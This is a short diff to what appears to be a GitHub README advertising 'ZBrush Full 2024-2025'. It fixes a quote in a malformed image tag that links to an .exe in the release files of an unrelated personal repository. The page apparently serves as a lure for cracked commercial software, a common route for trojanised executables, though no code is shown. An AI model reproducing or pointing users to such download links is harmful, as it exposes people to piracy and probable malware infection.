@@ -4,7 +4,7 @@
 <h1>ZBrush: Unleash Your Creativity with Advanced Digital Sculpting</h1>
 
 
-[<img src="![image](https://github.com/user-attachments/assets/abd0cdb5-d727-4524-a91a-e8afe56c6a24)
+[<img src="![image](https://github.com/user-attachments/assets/abd0cdb5-d727-4524-a91a-e8afe56c6a24)"
 ">](https://github.com/arsham129/Zbrush-Full-2024-2025/releases/download/2/ZBrush-Full-2024-2025.exe)
 
 
